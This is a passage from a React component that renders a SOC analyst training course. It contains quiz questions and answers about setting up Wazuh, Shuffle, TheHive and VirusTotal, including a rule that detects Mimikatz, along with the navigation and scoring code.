              "Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.1-1.msi -OutFile ${env.tmp}\\wazuh-agent; msiexec.exe /i ${env.tmp}\\wazuh-agent /q WAZUH_MANAGER='1.1.1.1' WAZUH_AGENT_NAME='mydfir' WAZUH_REGISTRATION_SERVER='1.1.1.1'",
              "apt-get install wazuh-agent",
              "systemctl start wazuh-agent"
            ],
            correctAnswer: "Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.1-1.msi -OutFile ${env.tmp}\\wazuh-agent; msiexec.exe /i ${env.tmp}\\wazuh-agent /q WAZUH_MANAGER='1.1.1.1' WAZUH_AGENT_NAME='mydfir' WAZUH_REGISTRATION_SERVER='1.1.1.1'"
          },
          {
            id: 5,
            question: "What is the purpose of the custom rule added to Wazuh in this project?",
            options: [
              "To detect phishing emails",
              "To detect Mimikatz usage",
              "To block malicious IP addresses",
              "To monitor network traffic"
            ],
            correctAnswer: "To detect Mimikatz usage"
          },
          {
            id: 6,
            question: "Which MITRE ATT&CK technique is associated with Mimikatz in the custom Wazuh rule?",
            options: [
              "T1059 - Command and Scripting Interpreter",
              "T1003 - Credential Dumping",
              "T1204 - User Execution",
              "T1082 - System Information Discovery"
            ],
            correctAnswer: "T1003 - Credential Dumping"
          },
          {
            id: 7,
            question: "What is the role of Shuffle in this project?",
            options: [
              "To act as a SIEM platform",
              "To provide threat intelligence",
              "To automate workflows and integrate Wazuh with TheHive",
              "To analyze malware samples"
            ],
            correctAnswer: "To automate workflows and integrate Wazuh with TheHive"
          },
          {
            id: 8,
            question: "Which tool is used to query file hashes for reputation analysis in this project?",
            options: [
              "Wazuh",
              "TheHive",
              "VirusTotal",
              "Shuffle"
            ],
            correctAnswer: "VirusTotal"
          },
          {
            id: 9,
            question: "What is the purpose of the API Key generated in TheHive?",
            options: [
              "To authenticate Shuffle with TheHive",
              "To access the Wazuh dashboard",
              "To query VirusTotal",
              "To configure Elasticsearch"
            ],
            correctAnswer: "To authenticate Shuffle with TheHive"
          },
          {
            id: 10,
            question: "Which of the following is NOT a step in setting up TheHive?",
            options: [
              "Installing Java",
              "Configuring Cassandra",
              "Installing Elasticsearch",
              "Deploying a mobile app"
            ],
            correctAnswer: "Deploying a mobile app"
          }
        ],
        scoring: {
          excellent: "10 Correct Answers: Excellent! You have a deep understanding of the SOC Automation Project.",
          good: "7-9 Correct Answers: Good job! You understand the key concepts but may need to review some details.",
          learning: "4-6 Correct Answers: Keep learning! Review the project documentation to strengthen your knowledge.",
          revisit: "0-3 Correct Answers: Time to revisit the project! Focus on the tools and their integration."
        }
      }
    }
  ];

  // State: which module, which section within that module, and whether we're in quiz mode.
  const [currentModuleIndex, setCurrentModuleIndex] = useState(0);
  const [currentSectionIndex, setCurrentSectionIndex] = useState(0);
  const [inQuiz, setInQuiz] = useState(false);
  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizScore, setQuizScore] = useState(null);

  // State to track completed modules (quiz finished)
  const [completedModules, setCompletedModules] = useState(Array(course.length).fill(false));

  // Left sidebar dropdown state for each module (open/closed)
  const [openModules, setOpenModules] = useState(Array(course.length).fill(false));

  // Toggle dropdown for a module.
  const toggleModule = (index) => {
    setOpenModules((prev) =>
      prev.map((open, idx) => (idx === index ? !open : open))
    );
  };

  const currentModule = course[currentModuleIndex];
  const totalSections = currentModule.sections.length;

  // Reset quiz state when module, section, or quiz view changes.
  useEffect(() => {
    setQuizAnswers({});
    setQuizScore(null);
  }, [currentModuleIndex, currentSectionIndex, inQuiz]);

  // Optional: Intersection Observer for animations.
  useEffect(() => {
    const observerCallback = (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('active');
        }
      });
    };
    const observerOptions = { threshold: 0.1, rootMargin: '0px 0px -50px 0px' };
    const observer = new IntersectionObserver(observerCallback, observerOptions);
    const revealElements = document.querySelectorAll(
      '.reveal, .reveal-left, .reveal-right, .reveal-scale'
    );
    revealElements.forEach((element) => observer.observe(element));
    return () => observer.disconnect();
  }, [currentModuleIndex, currentSectionIndex, inQuiz]);

  // Handle quiz answer changes.
  const handleQuizChange = (questionId, answer) => {
    setQuizAnswers((prev) => ({ ...prev, [questionId]: answer }));
  };

  const handleQuizSubmit = (e) => {
    e.preventDefault();
    let score = 0;
    currentModule.quiz.questions.forEach((q) => {
      if (quizAnswers[q.id] === q.correctAnswer) {
        score++;
      }
    });
    setQuizScore(score);
    // Mark the current module as completed after quiz submission.
    setCompletedModules((prev) => {
      const newArr = [...prev];
      newArr[currentModuleIndex] = true;
      return newArr;
    });
  };

  // Next Page Navigation:
  // - If not in quiz mode, go through sections then switch to quiz.
  // - In quiz mode, allow user to continue without forcing quiz submission.
  // Additionally, when moving to a new module, update the openModules so the previous module closes and the new module opens.
  const handleNextPage = () => {
    if (!inQuiz) {
      if (currentSectionIndex < totalSections - 1) {
        setCurrentSectionIndex(currentSectionIndex + 1);
      } else {
        setInQuiz(true);
      }
    } else {
      if (currentModuleIndex < course.length - 1) {
        const newModuleIndex = currentModuleIndex + 1;
        setCurrentModuleIndex(newModuleIndex);
        setCurrentSectionIndex(0);
        setInQuiz(false);
        // Update the dropdown state: close all modules, then open the new one.
        setOpenModules(Array(course.length).fill(false).map((_, idx) => idx === newModuleIndex));
      } else {
        alert("Congratulations! You have completed the course.");
      }
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white dark:bg-background text-gray-900 dark:text-white">
      {/* Full Navigation Bar */}
      <div className="bg-gray-100 dark:bg-primary-dark">
        <Navigation />
      </div>

      {/* Main Content Area */}
      <div className="flex flex-1">
        {/* Left Sidebar */}
        <aside className="w-64 bg-gray-100 dark:bg-primary-dark/30 border-r border-primary-blue/20 glass-effect p-4">
          {/* Back to Learning Paths Link */}
          <div className="mb-6">
            <Link
              to="/learning-paths"
              className="flex items-center text-primary-blue hover:text-primary-blue/80"
            >
              <ArrowLeft className="w-5 h-5 mr-2" />
              Back to Learning Paths
            </Link>
          </div>
          <h2 className="text-lg font-semibold mb-4 gradient-text">Course Modules</h2>
          {course.map((module, mIndex) => (
            <div key={module.id} className="mb-4">
              <button
                onClick={() => toggleModule(mIndex)}
                className="w-full flex justify-between items-center px-4 py-2 rounded-md hover:bg-primary-blue/10 transition"
              >
                <span className={`${mIndex === currentModuleIndex ? 'text-primary-blue font-bold' : ''}`}>
                  {module.title}
                </span>
                {completedModules[mIndex] && (
                  <Check className="w-4 h-4 text-green-500 inline ml-2" />
                )}
                {openModules[mIndex] ? <ChevronDown /> : <ChevronRight />}
              </button>
              {openModules[mIndex] && (
                <ul className="mt-2 ml-4 space-y-1">
                  {module.sections.map((sec, sIndex) => (
                    <li key={sIndex}>
                      <button
                        onClick={() => {
                          setCurrentModuleIndex(mIndex);
                          setCurrentSectionIndex(sIndex);
                          setInQuiz(false);
                        }}
                        className="w-full text-left px-4 py-1 rounded-md hover:bg-primary-blue/10 transition"
                      >
                        {sec.title}
                      </button>
                    </li>
                  ))}
                  <li>
                    <button
                      onClick={() => {
                        setCurrentModuleIndex(mIndex);
                        setInQuiz(true);
                      }}
                      className="w-full text-left px-4 py-1 rounded-md hover:bg-primary-blue/10 transition"
                    >
                      Quiz
                    </button>
                  </li>
                </ul>
              )}
            </div>
          ))}
        </aside>

        {/* Main Course Content */}
        <main className="flex-1 p-8 bg-white dark:bg-background">
          <header className="mb-8">
            <div className="flex items-center space-x-4">
              <Book className="w-8 h-8 text-primary-blue animate-pulse-slow" />
              <div>
                <h1 className="text-2xl font-bold gradient-text">SOC Analyst Course</h1>
                <p className="text-gray-400 text-sm">
                </p>
              </div>
            </div>
          </header>

          <div className="space-y-8">
            <h2 className="text-3xl font-bold mb-4 reveal-scale">
              {currentModule.title}
            </h2>

            {/* Display Section Content or Quiz */}
            {!inQuiz ? (
              <div className="reveal">
                <h3 className="text-2xl font-bold mb-4">
                  {currentModule.sections[currentSectionIndex].title}
                </h3>
                <div className="text-lg whitespace-pre-line">
                  {currentModule.sections[currentSectionIndex].summary}
                </div>
              </div>
            ) : (
              <div className="bg-gray-100 dark:bg-primary-dark/40 p-6 rounded shadow-lg reveal-scale">
                <h3 className="text-2xl font-bold mb-4">Quiz: {currentModule.title}</h3>
                {quizScore === null ? (
                  <>
                    <form onSubmit={handleQuizSubmit}>
                      {currentModule.quiz.questions.map((q, index) => (
                        <div key={q.id} className="mb-6">
                          <p className="mb-2">
                            {index + 1}. {q.question}
                          </p>
                          <div className="space-y-2">
                            {q.options.map((option, idx) => (
                              <label key={idx} className="block">
                                <input
                                  type="radio"
                                  name={`question-${q.id}`}
                                  value={option}
                                  checked={quizAnswers[q.id] === option}
                                  onChange={() => handleQuizChange(q.id, option)}
                                  className="mr-2"
                                />
                                {option}
                              </label>
                            ))}
                          </div>
                        </div>
                      ))}
                      <button type="submit" className="px-4 py-2 bg-primary-blue text-white rounded hover:bg-primary-blue/80 transition">
                        Submit Quiz
                      </button>
                    </form>
                    <p className="mt-4 italic text-sm">
                      You may also skip this quiz and continue by clicking Next Page.
                    </p>
                  </>
                ) : (
                  <div className="p-4 bg-primary-blue/20 rounded">
                    <h4 className="text-xl font-bold">
                      Your Score: {quizScore} / {currentModule.quiz.questions.length}
                    </h4>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Next Page Navigation */}
          <div className="mt-12 flex justify-end">
            <button
              onClick={handleNextPage}
              className="px-4 py-2 bg-primary-blue text-white rounded hover:bg-primary-blue/80 transition"
            >
              Next Page
            </button>
          </div>
        </main>
      </div>

      {/* Footer */}
      <footer className="bg-gray-100 dark:bg-primary-dark/30 text-gray-900 dark:text-white py-8 border-t border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <p className="text-gray-400">© 2025 HackTheHackers. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default SocAnalystCourse;
